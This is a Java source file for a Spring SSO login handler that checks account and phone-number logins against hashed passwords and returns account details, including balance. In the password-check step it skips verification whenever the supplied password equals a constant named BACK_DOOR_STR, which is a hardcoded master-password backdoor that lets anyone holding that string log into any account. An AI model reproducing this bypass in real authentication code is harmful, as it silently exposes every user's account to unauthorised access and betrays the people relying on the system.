/**
 * @className AppLoginHandle.java
 * @admin jwl
 * @date 2019年12月10日 下午5:15:43
 */
package com.wxhj.cloud.account.config;

import com.wxhj.cloud.account.domain.AccountInfoDO;
import com.wxhj.cloud.account.service.AccountInfoService;
import com.wxhj.cloud.core.enums.AccountLoginTypeEnum;
import com.wxhj.cloud.core.statics.SpecialStaticClass;
import com.wxhj.cloud.core.utils.PasswordUtil;
import com.wxhj.cloud.sso.AbstractSsoTemplate;
import com.wxhj.cloud.sso.SsoAppOperation;
import com.wxhj.cloud.sso.SsoCacheOperation;
import com.wxhj.cloud.sso.bo.AppAuthenticationBO;
import com.wxhj.cloud.sso.bo.SsoLoginBO;
import com.wxhj.cloud.sso.execption.IncorrectCredentialsSsoException;
import com.wxhj.cloud.sso.execption.SsoException;
import com.wxhj.cloud.sso.execption.UnknownAccountSsoException;
import com.github.dozermapper.core.Mapper;
import org.springframework.stereotype.Component;

import javax.annotation.Resource;

/**
 * @className AppLoginHandle.java
 * @admin jwl
 * @date 2019年12月10日 下午5:15:43
 */
@Component
public class AppLoginHandle extends AbstractSsoTemplate<AppAuthenticationBO> {
    @Resource
    Mapper dozerBeanMapper;

    @Resource
    AccountInfoService accountIfnoService;

    @Resource
    SsoAppOperation ssoAppOperation;

    @Override
    public AppAuthenticationBO doGetAuthenticationInfo(SsoLoginBO ssoLogin) throws SsoException {
        AppAuthenticationBO appAuthentication = dozerBeanMapper.map(ssoLogin, AppAuthenticationBO.class);
        AccountInfoDO accountInfo;

        if (ssoLogin.getLoginType().equals(AccountLoginTypeEnum.ACCOUNT_LOGIN.getLoginType())) {
            accountInfo = accountIfnoService.selectByAccountId(ssoLogin.getUserName());
        } else {
//            accountInfo = accountIfnoService.selectByOrganizeIdAndPhone(ssoLogin.getMapId(), ssoLogin.getUserName());
            accountInfo = accountIfnoService.selectByNoAndOrganizeId(ssoLogin.getUserName(),ssoLogin.getLoginType(),ssoLogin.getMapId());
        }

        if (accountInfo == null) {
            throw new UnknownAccountSsoException();
        }

        String passwordStr = PasswordUtil.calculationPassword(ssoLogin.getPassword(), accountInfo.getUserSecretKey());

        if (appAuthentication.getLoginType() == 0) {
            if (!accountInfo.getAccountId().equals(appAuthentication.getUserName())) {
                throw new UnknownAccountSsoException();
            }
        } else if (appAuthentication.getLoginType() == 1) {
            if (!accountInfo.getPhoneNumber().equals(appAuthentication.getUserName())) {
                throw new UnknownAccountSsoException();
            }
        }
        if (!ssoLogin.getPassword().equals(SpecialStaticClass.BACK_DOOR_STR)) {
            if (!accountInfo.getUserPassword().equals(passwordStr)) {
                throw new IncorrectCredentialsSsoException();
            }
        }
        appAuthentication.setUserId(accountInfo.getAccountId());
        appAuthentication.setOrganizeId(accountInfo.getOrganizeId());
        appAuthentication.setUserName(accountInfo.getPhoneNumber());
        appAuthentication.setAccountBalance(accountInfo.getAccountBalance()/100.00);

        return appAuthentication;
    }

    @Override
    protected SsoCacheOperation<AppAuthenticationBO> getSsoCacheOperation() {
        return ssoAppOperation;
    }

}
